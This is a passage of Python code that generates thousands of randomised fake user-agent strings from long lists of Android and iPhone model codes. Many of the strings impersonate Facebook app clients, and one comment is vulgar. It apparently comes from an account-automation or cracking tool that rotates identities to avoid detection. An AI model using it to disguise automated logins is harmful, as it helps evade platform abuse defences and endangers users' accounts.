-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
   strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; Infinix {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
   strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
  
   ugen.append(strvoppo)
   ugen.append(strvredmi)
   ugen.append(strvoppo1)
   ugen.append(strvinfinix)
   ugen.append(strvsamsung)
   ugen.append(strvredmi1)
   ugen.append(strvnokiax)
   ugen.append(strvgt)
via=[]
for xd in range(10000):
	rr = random.randint; rc = random.choice
	gt = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H'] 
	strvgt = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
	uateddy = random.choice([strvgt])
	via.append(uateddy)
smss = []
for xd in range(1000):
	rr = random.randint; rc = random.choice
	sm=['SM-A013F','SM-A013G','SM-A013M','SM-A015A','SM-A015F','SM-A015G','SM-A015M','SM-A022F','SM-A022G','SM-A022M','SM-A025F','SM-A025G','SM-A025M','SM-A032F','SM-A032M','SM-A035F','SM-A035M','SM-A027F','SM-A037G','SM-A037M','SM-A125F','SM-A125M','SM-A125U','SM-A127F','SM-A127M','SM-A135F','SM-A135M','SM-A202F','SM-A205F','SM-A205G','SM-A205U','SM-A207F','SM-A207M','SM-A217F','SM-A217M','SM-A225F','SM-A225M','SM-A260F','SM-A260G','SM-A305F','SM-A305G','SM-A307FN','SM-A307G','SM-A310F','SM-A315F','SM-A315G','SM-A325F','SM-A325M','SM-A415F','SM-A505F','SM-A505FN','SM-A505G','SM-A510F','SM-A515F','SM-A520F','SM-A520W','SM-A525F','SM-A528B','SM-A530F','SM-A715F','SM-A725F','SM-A920F','SM-J250F','SM-J260F','SM-J260G','SM-J260M','SM-J320A','SM-J320F','SM-J330F','SM-J330FN','SM-J400F','SM-J410F','SM-J410G','SM-J415F','SM-J415FN','SM-J415G','SM-J500F','SM-J500FN','SM-J500G','SM-J500H','SM-J500M','SM-J510FN','SM-J510F','SM-J530F','SM-J530G','SM-J600F','SM-J600FN','SM-J600G','SM-J610F','SM-J610FN','SM-J610G','SM-J700F','SM-J700M','SM-J701F','SM-J701M','SM-J730G','SM-M127F','SM-M215F','SM-M315F','SM-M515F','SM-N770F','SM-N9005','SM-N910C','SM-N910F','SM-N910G','SM-N910V','SM-N920V','SM-N950F','SM-N950U','SM-N960F','SM-N960U','SM-N975F','SM-N975U','SM-N980F','SM-N985F','SM-S367VL','SM-S767VL','SM-S906E','SM-S906U','SM-908B','SM-S908E','SM-T290','SM-T295','SM-T387V','SM-T505','SM-T510']
	ugent1=f"{str(rc(sm))}"
	brows = random.choice([ugent1])
	smss.append(brows)
for op in range(1000):
	rr = random.randint
	rc = random.choice
	bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
	ua1 = f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua2 = f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua3 = f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua4 = f"Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	ugen.append(ua1)
	ugen.append(ua2)
	ugen.append(ua3)
	ugen.append(ua4)
	ugen.append(ua5)
	
#--------[ Kontol-Fiixc4You ]----------#
for generate in range(100):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen.append(uaku)
	




def ummmah():
	rr = random.randint
	rc = random.choice
	az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	Hi = ['en_GB','en_US','id_ID','zh_CN','pt_BR','es_ES']
	bi = ['zh-cn;','en-nz;','vi-vn;','hi-in;','en-us;','id-id;','en-gb;','ru-ru;','jap-jap;','en-ca;','es-mx;','zh-tw;','ko-kr;','th-th;','en-in;','el-gr;','tr-tr;','fr-fr;','en-ez;','zh-hk;','ar-ae;','ru-ru;','zh-CN;en-US;','fr-ch;','pt-br;','nl-nl;','gu-in;']
	Mo = ['SM-G6100', 'SM-G610L', 'SM-G610K']
	Mu = ['SM-G9287C', 'SM-G9287', 'SM-G928A', 'SM-G928F']
	An = ['8.1.0', '6.0.1', '8.0.0', '7.0', '5.1.1']
	return str(rc([f"Mozilla/5.0 (Linux; Android {str(rr(6, 14))}; Android 10; Redmi K20 Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80, 105))}.0.{str(rr(1111, 4896))}.{str(rr(100, 400))} Mobile Safari/537.36"]))

user=[]
for ua in range(10000):
	a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	b=random.randrange(111111,210000)
	c=random.randrange(73,110)
	d=random.randrange(33300,88800)
	e=random.randrange(40,250)
	z=random.randrange(113,117)
	h=random.randrange(11,19)
	g=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	i=random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
	ii=random.choice(['en','id','de','ru','en','fr','fa','ja','pt','cs','zh','zh','vi','tr'])
	oppo=random.choice(['CPH2437','CPH2351','CPH2048','CPH2389','CPH2359','CPH2363','CPH2211','PGX110','CPH1917'])
	oppo2 = random.choice(["PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
	rilmi= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
	model = random.choice(["EdgA/41.1.35.1","EdgA/94.0.992.50","EdgA/98.0.1108.62","EdgA/114.0.1823.61","EdgA/111.0.1661.59"])
	iphone = random.choice(["11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2"])
	iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	iphone2 = random.choice(["7B367","15E148","11A465","8A293","8B117","19G82","15E148","18F72","20G75"])
	zax1=f'Mozilla/5.0 (Linux; Android {a}; {redmi}){rilmi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.0.0 Mobile Safari/537.36'
	zax2=f'Mozilla/5.0 (Linux; Android {a}; {oppo}){oppo2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax3=f'Mozilla/5.0 (Linux; Android {a}; {oppo}) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{h}.0.{a} Mobile Mobile/{iphone2} Safari/60{h}.1'
	zax5=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	uaku2 = random.choice([zax1,zax2,zax3,zax4,zax5])
	ugen.append(uaku2)
	
def random_ua():
	model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
	abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
	build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
	fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
	ua1 = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') Safari/604.1'
	ua2 = "Mozilla/5.0 (iPhone "+str(random.randrange(4,6))+" X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/"+str(random.randint(4,13))+".1.1 Mobile/"+model+" Safari/604.1"
	dv_typ = random.choice(['SM-N910C','SM-N910S','SM-N910H','SM-N910F','SM-N910L','SM-N910T3'])
	ua3 = f"Mozilla/5.0 (Linux; Android {str(random.randint(4,13))}; "+dv_typ+") AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Mobile Safari/537.36"
	a = random.randrange(112,115)
	b = random.randrange(1000,10000)
	c = random.randrange(10,100)
	os_ver = random.randrange(10,13)
	dv_typ = random.choice(['RMX3261','RMX3263','RMX3193','RMX3191','RMX2075','RMX2076'])
	bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
	dv_ver = random.randrange(100000,250000)
	sd_ver = random.randrange(1,10)
	ch_ver = f'{a}.0.{b}.{c}'
	ua4 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
	a = random.randrange(112,115)
	b = random.randrange(1000,10000)
	c = random.randrange(10,100)
	os_ver = random.randrange(10,13)
	dv_typ = random.choice(['SM-G900FD','SM-G800H','SM-G800F','SM-G800M','SM-G800Y','SM-J337U'])
	bl_typ = random.choice(['PPR1','KTU84P','R16NW','TP1A','RKQ1','SP1A','RP1A'])
	dv_ver = random.randrange(100000,250000)
	sd_ver = random.randrange(1,10)
	ch_ver = f'{a}.0.{b}.{c}'
	ua5 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
	a = random.randrange(112,115)
	b = random.randrange(1000,10000)
	c = random.randrange(10,100)
	os_ver = random.randrange(10,13)
	dv_typ = random.choice(['vivo 1805','vivo 1812','V2048A','Y51L','1707','V1901A','V1901T'])
	bl_typ = random.choice(['UP1A','PKQ1','QP1A','TP1A','MMB29M','RP1A'])
	dv_ver = random.randrange(100000,250000)
	sd_ver = random.randrange(1,10)
	ch_ver = f'{a}.0.{b}.{c}'
	ua6 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
	ua = random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
	return(ua)
realme = random.choice(["RMX2072","RMX2086","RMX3350"])


for ran in range(1000):
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for tkm1 in range(1000):
	model=random.choice(["V2232A","V2060","vivo Y97 Build/O11019","vivo Y17 Build/PPR1.180610.011","V1930A Build/PKQ1.190616.001","V2164KA","V1816A Build/PKQ1.180819.001","V2249","V2040","V2030","V2029","vivo 1610 Build/MMB29M","vivo 2018","vivo 1814 Build/O11019","V2244A"])
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; {model}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36 VivoBrowser/{random.randrange(6,18)}.{random.randrange(6,10)}.0.{random.randrange(6,10)}"
	ugen.append(ua)
for tkm2 in range(1000):
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; STELLAR P6 Build/SP1A.{random.randrange(111111,999999)}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for tkm3 in range(1000):
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; Infinix X680B Build/QP1A.{random.randrange(111111,999999)}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for tkm4 in range(1000):
	v=random.randrange(111111,999999)
	fb=random.choice([f"STELLAR P6|SP1A.{v}.016","SHIELD|LMY47N",f"6002A|RP1A.{v}.011",f"AKUS PRO|QP1A.{v}.020","MX-A10R|S00812",f"iT-KSA0012|PPR1.{v}.011",f"Nokia C2|PPR1.{v}.011",f"MT10|TQ1A.{v}.002.A1",f"ZTE A2023PG|SKQ1.{v}.001","iris65|O11019",f"Hisense Infinity H50S 5G|RP1A.{v}.011",f"itel A661WP|RP1A.{v}.001",f"itel A611W|RP1A.{v}.001",f"itel W5008|OPM2.{v}.012","Flare_S7_Mini|O21019","Flare_J2_Max|O21019","BBC100-1|NMF26F",f"itel W5008|OPM2.{v}.012",f"itel A632W|SP1A.{v}.016",f"Hisense V50|RP1A.{v}.001"])
	mdl,bld=fb.split('|')
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; {mdl} Build/{bld}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,200)}.0.{random.randrange(4200,4900)}.{random.randrange(40,200)} Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for tkm5 in range(1000):
	ua=f"Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_0_1 like Mac OS X; en_US) AppleWebKit (KHTML, like Gecko) Mobile [FBAN/FBForIPhone;FBAV/4.1;FBBV/{random.randrange(1111,4100)}.0;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/5.0.1;FBSS/2; FBCR/Three;FBID/phone;FBLC/en_US;FBSF/2.0]"
	ugen.append(ua)
for tkm6 in range(1000):
	ua=f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/{random.randrange(100,500)}.1.0.{random.randrange(20,100)}.{random.randrange(80,200)};FBBV/{random.randrange(111111111,999999999)};FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/{random.randrange(111111111,999999999)}]"
	ugen.append(ua)
for tkm7 in range(1000):
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; CPH1937 Build/PKQ1.{random.randrange(111111,999999)}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for tkm8 in range(1000):
	mdl=random.choice(["RMX2155","RMX3085","RMX2151"])
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; {mdl} Build/QP1A.{random.randrange(111111,999999)}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for tkm9 in range(1000):
	mdl=random.choice(['CPH1114','CPH1235','CPH1451','CPH1615','CPH1664','CPH1869','CPH1929','CPH1985','CPH2048','CPH2068','CPH2107','CPH2238','CPH2261','CPH2331','CPH2332','CPH2351','CPH2381','CPH2389','CPH2399','CPH2401','CPH2409','CPH2411','CPH2413','CPH2415','CPH2417','CPH2419','CPH2423','CPH2447','CPH2449','CPH2451','CPH2459','CPH2465','CPH2467','CPH2469','CPH2487','CPH2491','CPH2493','CPH2499','CPH2513','CPH2515','CPH2519','CPH2521','CPH2523','CPH2525','CPH2529','CPH2551','CPH2553','CPH2557','CPH2569','CPH2579','CPH2581','CPH2583','CPH2589','CPH2591','CPH2599','CPH2607','CPH2609','CPH2611','CPH2617','CPH2643','CPH3475','CPH3669','CPH3682','CPH3731','CPH3776','CPH3785','CPH4125','CPH4275','CPH4299','CPH4395','CPH4473','CPH4987','CPH5286','CPH5841','CPH5947','CPH6178','CPH6244','CPH6271','CPH6316','CPH6519','CPH6528','CPH6697','CPH7338','CPH7364','CPH7382','CPH7532','CPH7577','CPH7948','CPH7991','CPH8153','CPH8346','CPH8347','CPH8363','CPH8393','CPH8467','CPH8472','CPH8534','CPH8686','CPH8893','CPH9177','CPH9226','CPH9659','CPH9667','CPH9716','CPH9763','CPH9839','CPH9929','R830','R830S','R833T','R9','R9 Plus','R9km','R9s','R9s Plus','R9t','R9tm','Real','Reno','Reno 10','Reno 10 5G','Reno 10 Pro 5G','Reno 10 Pro+ 5G','Reno 10X','Reno 10X Zoom','Reno 2','Reno 2F','Reno 2Z','Reno 3','Reno 3 5G','Reno 3 Lite','Reno 3 Pro','Reno 3A','Reno 4 4G','Reno 4 5G','Reno 4 Lite','Reno 4 Pro 4G','Reno 4 Pro 5G','Reno 4 SE 5G','Reno 4F','Reno 4Z 5G','Reno 5','Reno 5 5G','Reno 5 Lite','Reno 5 Pro 5G','Reno 5 Pro Plus 5G','Reno 5A','Reno 5F','Reno 5G','Reno 5K','Reno 5K 5G','Reno 